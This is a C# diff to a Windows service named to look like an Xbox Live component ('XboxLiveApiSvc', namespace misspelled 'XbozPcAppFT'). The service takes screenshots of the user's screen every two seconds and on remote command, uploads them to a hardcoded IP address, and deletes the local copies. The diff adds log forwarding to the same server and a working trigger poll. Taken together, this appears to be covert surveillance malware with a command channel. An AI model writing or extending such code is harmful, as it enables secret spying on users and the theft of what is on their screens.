@@ -18,6 +18,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Timers;
+using System.Text.Json;
 
 namespace XbozPcAppFT
 {
@@ -50,6 +51,44 @@ namespace XbozPcAppFT
     {
         private static readonly HttpClient client = new HttpClient();
         private const int ChunkSize = 1024 * 1024; // 1MB
+        private static EventLog _eventLog;
+        private static string _serverUrl;
+
+        public static void SetEventLog(EventLog eventLog)
+        {
+            _eventLog = eventLog;
+        }
+
+        public static void SetServerUrl(string serverUrl)
+        {
+            _serverUrl = serverUrl;
+        }
+
+        private static async void SendLogToServerAsync(string logMessage, string level = "INFO")
+        {
+            try
+            {
+                if (string.IsNullOrEmpty(_serverUrl)) return;
+
+                var logData = new
+                {
+                    timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
+                    level = level,
+                    message = logMessage,
+                    source = "XboxLiveApiSvc"
+                };
+
+                string jsonContent = System.Text.Json.JsonSerializer.Serialize(logData);
+                var content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
+
+                // Send log asynchronously, don't wait for response to avoid blocking
+                _ = client.PostAsync($"{_serverUrl}/api/logs", content);
+            }
+            catch
+            {
+                // Silently ignore log forwarding errors to prevent infinite loops
+            }
+        }
 
         public static async Task UploadFileAsync(string localPath, string serverUrl)
         {
@@ -57,46 +96,86 @@ namespace XbozPcAppFT
             long totalSize = fi.Length;
             string fileName = Path.GetFileName(localPath);
 
-            using (FileStream fs = new FileStream(localPath, FileMode.Open, FileAccess.Read))
+            string logMsg = $"Starting upload of {fileName} ({totalSize:N0} bytes) to {serverUrl}";
+            _eventLog?.WriteEntry(logMsg);
+            SendLogToServerAsync(logMsg);
+
+            try
             {
-                long offset = 0;
-                while (offset < totalSize)
+                using (FileStream fs = new FileStream(localPath, FileMode.Open, FileAccess.Read))
                 {
-                    int bytesToRead = (int)Math.Min(ChunkSize, totalSize - offset);
-                    byte[] buffer = new byte[bytesToRead];
-                    fs.Seek(offset, SeekOrigin.Begin);
-                    await fs.ReadAsync(buffer, 0, bytesToRead);
+                    long offset = 0;
+                    int chunkCount = 0;
+                    int totalChunks = (int)Math.Ceiling((double)totalSize / ChunkSize);
 
-                    bool success = false;
-                    int retries = 3;
-                    while (!success && retries > 0)
+                    while (offset < totalSize)
                     {
-                        try
-                        {
-                            using (var content = new ByteArrayContent(buffer))
-                            {
-                                content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
-                                content.Headers.Add("Content-Range", $"bytes {offset}-{offset + bytesToRead - 1}/{totalSize}");
+                        chunkCount++;
+                        int bytesToRead = (int)Math.Min(ChunkSize, totalSize - offset);
+                        byte[] buffer = new byte[bytesToRead];
+                        fs.Seek(offset, SeekOrigin.Begin);
+                        await fs.ReadAsync(buffer, 0, bytesToRead);
 
-                                HttpResponseMessage response = await client.PostAsync($"{serverUrl}/upload/{fileName}", content);
-                                response.EnsureSuccessStatusCode();
-                                success = true;
+                        bool success = false;
+                        int retries = 3;
+                        Exception lastError = null;
+
+                        while (!success && retries > 0)
+                        {
+                            try
+                            {
+                                using (var content = new ByteArrayContent(buffer))
+                                {
+                                    content.Headers.ContentType = new MediaTypeHeaderValue("application/octet-stream");
+                                    content.Headers.Add("Content-Range", $"bytes {offset}-{offset + bytesToRead - 1}/{totalSize}");
+
+                                    HttpResponseMessage response = await client.PostAsync($"{serverUrl}/upload/{fileName}", content);
+                                    response.EnsureSuccessStatusCode();
+                                    success = true;
+                                    
+                                    double progressPercent = (double)(offset + bytesToRead) / totalSize * 100;
+                                    string progressMsg = $"Upload progress: Chunk {chunkCount}/{totalChunks} completed ({progressPercent:F1}%)";
+                                    _eventLog?.WriteEntry(progressMsg);
+                                    SendLogToServerAsync(progressMsg);
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                lastError = ex;
+                                retries--;
+                                if (retries > 0)
+                                {
+                                    string retryMsg = $"Chunk {chunkCount} failed, retrying... ({ex.Message})";
+                                    _eventLog?.WriteEntry(retryMsg);
+                                    SendLogToServerAsync(retryMsg, "WARNING");
+                                }
                             }
                         }
-                        catch (Exception ex)
+
+                        if (!success)
                         {
-                            retries--;
-                            Console.WriteLine($"Retrying chunk {offset} - {ex.Message}");
-                            if (retries == 0) throw;
+                            string failMsg = $"Failed to upload chunk {chunkCount} after 3 attempts: {lastError?.Message}";
+                            _eventLog?.WriteEntry(failMsg);
+                            SendLogToServerAsync(failMsg, "ERROR");
+                            throw new Exception(failMsg, lastError);
                         }
+
+                        offset += bytesToRead;
                     }
-
-                    offset += bytesToRead;
                 }
-            }
 
-            Console.WriteLine("Upload complete!");
-            File.Delete(localPath);
+                string completeMsg = $"Upload completed successfully: {fileName} ({totalSize:N0} bytes)";
+                _eventLog?.WriteEntry(completeMsg);
+                SendLogToServerAsync(completeMsg);
+                File.Delete(localPath);
+            }
+            catch (Exception ex)
+            {
+                string errorMsg = $"Upload failed for {fileName}: {ex.Message}";
+                _eventLog?.WriteEntry(errorMsg);
+                SendLogToServerAsync(errorMsg, "ERROR");
+                throw;
+            }
         }
     }
 
@@ -105,12 +184,43 @@ namespace XbozPcAppFT
     {
         private Thread _triggerThread;
         private CancellationTokenSource _cts;
+        private static readonly HttpClient _logClient = new HttpClient();
+        private string _serverUrl = "http://202.182.127.60:8000";
 
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);
 
         private EventLog _eventLog1;
         private int eventId = 1;
+
+        private void WriteEntryAndSendToServer(string message, EventLogEntryType entryType = EventLogEntryType.Information)
+        {
+            // Write to local event log
+            _eventLog1.WriteEntry(message, entryType);
+
+            // Send to server asynchronously
+            _ = Task.Run(async () =>
+            {
+                try
+                {
+                    var logData = new
+                    {
+                        timestamp = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffZ"),
+                        level = entryType.ToString().ToUpper(),
+                        message = message,
+                        source = "XboxLiveApiSvc"
+                    };
+
+                    string jsonContent = System.Text.Json.JsonSerializer.Serialize(logData);
+                    var content = new StringContent(jsonContent, Encoding.UTF8, "application/json");
+                    await _logClient.PostAsync($"{_serverUrl}/api/logs", content);
+                }
+                catch
+                {
+                    // Silently ignore log forwarding errors
+                }
+            });
+        }
 
         public XboxLiveApiSvc()
         {
@@ -122,11 +232,15 @@ namespace XbozPcAppFT
             }
             _eventLog1.Source = "XboxSource";
             _eventLog1.Log = "XboxLog";
+            
+            // Set the EventLog and ServerUrl for HttpUploader to use
+            HttpUploader.SetEventLog(_eventLog1);
+            HttpUploader.SetServerUrl(_serverUrl);
         }
 
         protected override void OnStart(string[] args)
         {
-            _eventLog1.WriteEntry("In OnStart.");
+            WriteEntryAndSendToServer("Service starting up...");
 
             // Update the service state to Start Pending.
             ServiceStatus serviceStatus = new ServiceStatus();
@@ -135,7 +249,7 @@ namespace XbozPcAppFT
             SetServiceStatus(this.ServiceHandle, ref serviceStatus);
 
             // 1️⃣ Take a screenshot immediately
-            _eventLog1.WriteEntry("Taking immediate screenshot on start...");
+            WriteEntryAndSendToServer("Taking immediate screenshot on service start...");
             TakeScreenshot();
 
             // 2️⃣ Set up a timer that triggers every 2s.
@@ -145,16 +259,19 @@ namespace XbozPcAppFT
             };
             timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
             timer.Start();
+            WriteEntryAndSendToServer("Screenshot timer started (2 second interval)");
 
             // 3️⃣ Start trigger polling loop in background thread
             _cts = new CancellationTokenSource();
             _triggerThread = new Thread(() => PollTriggerLoop(_cts.Token));
             _triggerThread.IsBackground = true;
             _triggerThread.Start();
+            WriteEntryAndSendToServer("Trigger polling thread started");
 
             // Update the service state to Running.
             serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
             SetServiceStatus(this.ServiceHandle, ref serviceStatus);
+            WriteEntryAndSendToServer("Service started successfully and is now running");
         }
 
         protected override void OnStop()
@@ -184,17 +301,17 @@ namespace XbozPcAppFT
 
         private void PollTriggerLoop(CancellationToken token)
         {
-            _eventLog1.WriteEntry("Trigger polling thread started.");
+            WriteEntryAndSendToServer("Trigger polling thread started");
             try
             {
                 while (!token.IsCancellationRequested)
                 {
-                    // ✅ Example: poll your /trigger endpoint
+                    // Poll the server for screenshot triggers
                     bool shouldTakeScreenshot = CheckTriggerFromServer();
 
                     if (shouldTakeScreenshot)
                     {
-                        _eventLog1.WriteEntry("Trigger received! Taking screenshot...");
+                        WriteEntryAndSendToServer("Manual screenshot trigger received from web interface!");
                         TakeScreenshot();
                     }
 
@@ -203,26 +320,47 @@ namespace XbozPcAppFT
             }
             catch (Exception ex)
             {
-                _eventLog1.WriteEntry($"PollTriggerLoop exception: {ex.Message}");
+                WriteEntryAndSendToServer($"PollTriggerLoop exception: {ex.Message}", EventLogEntryType.Error);
             }
             finally
             {
-                _eventLog1.WriteEntry("Trigger polling thread stopped.");
+                WriteEntryAndSendToServer("Trigger polling thread stopped");
             }
         }
 
         private bool CheckTriggerFromServer()
         {
-            // TODO: implement HTTP GET/POST to your FastAPI /trigger
-            // Example pseudo-code (use HttpClient):
-            /*
-            using (var client = new HttpClient())
+            try
             {
-                var response = client.GetAsync("http://server:8000/check_trigger").Result;
-                string result = response.Content.ReadAsStringAsync().Result;
-                return result.Contains("take_screenshot");
+                using (var client = new HttpClient())
+                {
+                    client.Timeout = TimeSpan.FromSeconds(10); // 10 second timeout
+                    var response = client.GetAsync($"{_serverUrl}/check_trigger").Result;
+                    
+                    if (response.IsSuccessStatusCode)
+                    {
+                        string result = response.Content.ReadAsStringAsync().Result;
+                        
+                        // Simple JSON parsing to check for trigger
+                        if (result.Contains("\"trigger\": true") && result.Contains("\"action\": \"take_screenshot\""))
+                        {
+                            WriteEntryAndSendToServer("Received screenshot trigger from server");
+                            return true;
+                        }
+                    }
+                }
             }
-            */
+            catch (Exception ex)
+            {
+                // Log polling errors only occasionally to avoid spam
+                DateTime lastLogTime = DateTime.MinValue;
+                if (DateTime.Now - lastLogTime > TimeSpan.FromMinutes(5))
+                {
+                    WriteEntryAndSendToServer($"Trigger polling failed: {ex.Message}", EventLogEntryType.Warning);
+                    lastLogTime = DateTime.Now;
+                }
+            }
+            
             return false;
         }
 
@@ -238,7 +376,7 @@ namespace XbozPcAppFT
             string userTempDir = $@"C:\Users\{userName}\AppData\Local\Temp";
             try
             {
-                _eventLog1.WriteEntry("Attempting to trigger scheduled task for screenshot...");
+                WriteEntryAndSendToServer("Attempting to trigger scheduled task for screenshot...");
 
                 // 1️⃣ Run the scheduled task
                 ProcessStartInfo psi = new ProcessStartInfo
@@ -258,10 +396,10 @@ namespace XbozPcAppFT
                     proc.WaitForExit();
 
                     if (proc.ExitCode == 0)
-                        _eventLog1.WriteEntry($"Scheduled task triggered successfully: {output}");
+                        WriteEntryAndSendToServer($"Scheduled task triggered successfully: {output.Trim()}");
                     else
                     {
-                        _eventLog1.WriteEntry($"Scheduled task failed (code {proc.ExitCode}): {error}");
+                        WriteEntryAndSendToServer($"Scheduled task failed (code {proc.ExitCode}): {error.Trim()}", EventLogEntryType.Error);
                         return; // Skip upload if task failed
                     }
                 }
@@ -277,16 +415,16 @@ namespace XbozPcAppFT
 
                 if (latestScreenshot == null)
                 {
-                    _eventLog1.WriteEntry("No screenshot file found in user's temp folder.");
+                    WriteEntryAndSendToServer("No screenshot file found in user's temp folder.", EventLogEntryType.Warning);
                     return;
                 }
 
                 string localPath = latestScreenshot.FullName;
                 string fileName = latestScreenshot.Name;
 
-                _eventLog1.WriteEntry($"Found screenshot: {fileName}");
+                WriteEntryAndSendToServer($"Found screenshot: {fileName} ({latestScreenshot.Length:N0} bytes)");
 
-                // 4️⃣ Upload via SFTP
+                // 4️⃣ Upload via HTTP
                 try
                 {
                     string serverUrl = "http://202.182.127.60:8000"; // FastAPI server endpoint
@@ -295,17 +433,17 @@ namespace XbozPcAppFT
 
                     // 5️⃣ Clean up
                     File.Delete(localPath);
-                    _eventLog1.WriteEntry($"Screenshot uploaded and deleted: {fileName}");
+                    WriteEntryAndSendToServer($"Screenshot uploaded and deleted: {fileName}");
                 }
                 catch (Exception ex)
                 {
-                    _eventLog1.WriteEntry($"Screenshot upload failed: {ex.Message}\n{ex.StackTrace}");
+                    WriteEntryAndSendToServer($"Screenshot upload failed: {ex.Message}", EventLogEntryType.Error);
                 }
 
             }
             catch (Exception ex)
             {
-                _eventLog1.WriteEntry($"Screenshot failed: {ex.Message}\n{ex.StackTrace}");
+                WriteEntryAndSendToServer($"Screenshot operation failed: {ex.Message}", EventLogEntryType.Error);
             }
         }
 
